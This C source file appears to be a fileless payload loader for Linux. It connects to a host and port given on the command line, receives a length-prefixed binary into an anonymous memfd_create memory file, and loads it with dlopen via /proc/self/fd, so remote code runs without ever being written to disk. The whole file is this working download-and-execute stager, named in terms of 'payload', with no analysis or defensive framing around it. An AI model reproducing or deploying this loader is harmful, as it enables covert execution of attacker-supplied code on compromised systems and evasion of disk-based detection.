#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <errno.h>
#include <sys/mman.h>
#include <dlfcn.h>
#include <fcntl.h>

int connect_to_server(char* host, unsigned short port);
int create_payload(char* host, unsigned short port);
int fetch_payload(int sock, int fd, int file_size);
int run_payload(int fd);
int read_length(int sock);

int main(int argc, char* argv[]) {
	int memfd;
	memfd = create_payload(argv[1], atoi(argv[2]));
	run_payload(memfd);
	return EXIT_SUCCESS;
}

int create_payload(char* host, unsigned short port) {
	int fd;
	int sock;
	int file_size;
	fd = memfd_create("", MFD_CLOEXEC);
	if (fd == -1) {
		perror("memfd_create");
		exit(EXIT_FAILURE);
	}

	sock = connect_to_server(host, port);
	if (sock == -1) {
		exit(EXIT_FAILURE);
	}

	file_size = read_length(sock);
	if (file_size == -1) {
		exit(EXIT_FAILURE);
	}

	if (fetch_payload(sock, fd, file_size) == -1) {
		exit(EXIT_FAILURE);
	}
	close(sock);
	return fd;
}

int connect_to_server(char* host, unsigned short port) {
	struct addrinfo hints = { 0 };
	struct addrinfo* ai_result;
	struct addrinfo* ai;
	int ret;
	int sock;
	char portstr[32];
	
	snprintf(portstr, sizeof(portstr), "%u", port);

	hints.ai_family = AF_INET; /* IPv4 */
	hints.ai_socktype = SOCK_STREAM;

	ret = getaddrinfo(host, portstr, &hints, &ai_result);
	if (ret != 0) {
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(ret));
		return -1;
	}

	for (ai = ai_result; ai != NULL; ai = ai->ai_next) {
		sock = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
		if (sock == -1) {
			perror("socket");
			continue;
		}

		if (connect(sock, ai->ai_addr, ai->ai_addrlen) == -1) {
			perror("connect");
			close(sock);
			continue;
		}
		break; /* if we made it here, we were sucessful */
	}

	freeaddrinfo(ai_result);

	if (ai == NULL) {
		fprintf(stderr, "Could not find a suitable address\n");
		return -1;
	}

	return sock;
}

int read_length(int sock) {
	int length;
	ssize_t ret;

	ret = recv(sock, (unsigned char*)&length, sizeof(length), MSG_WAITALL);
	if (ret == -1) {
		perror("recv");
		return -1;
	}

	if (ret != sizeof(length)) {
		return -1;
	}

	length = ntohl(length);

	return length;
}

int fetch_payload(int sock, int fd, int file_size) {
	unsigned char buffer[1024];
	int bytes_read;
	int recvd;
	bytes_read = 0;
	while (bytes_read < file_size) {
		recvd = recv(sock, buffer, 1024, 0);
		if (recvd == 0) {
			return -1;
		}
		if (recvd == -1) {
			perror("recv");
			return -1;
		}
		if (write(fd, buffer, recvd) == -1) {
			perror("write");
			return -1;
		}
		bytes_read += recvd;
	}
	return 0;
}

int run_payload(int fd) {
	char path[32];
	if (snprintf(path, sizeof(path), "/proc/self/fd/%d", fd) < 0) {
		return -1;
	}
	if (dlopen(path, RTLD_LAZY) == NULL) {
		return -1;
	}
	return 0;
}

